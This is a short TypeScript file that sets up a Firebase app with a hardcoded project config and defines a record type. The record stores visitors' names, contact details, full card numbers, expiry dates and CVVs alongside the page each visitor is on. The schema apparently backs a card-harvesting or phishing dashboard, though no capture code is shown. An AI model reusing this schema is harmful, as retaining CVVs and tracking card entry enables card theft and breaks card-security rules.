import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
 apiKey: "AIzaSyBgaoqCdnsft-7OeF8hZaX1gLB_cCcDsNE",
  authDomain: "dzttsa.firebaseapp.com",
  databaseURL: "https://dzttsa-default-rtdb.firebaseio.com",
  projectId: "dzttsa",
  storageBucket: "dzttsa.firebasestorage.app",
  messagingSenderId: "700845190471",
  appId: "1:700845190471:web:bd56ec43a0108a2d69b062",
  measurementId: "G-XT6ZYZ7VPQ"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}



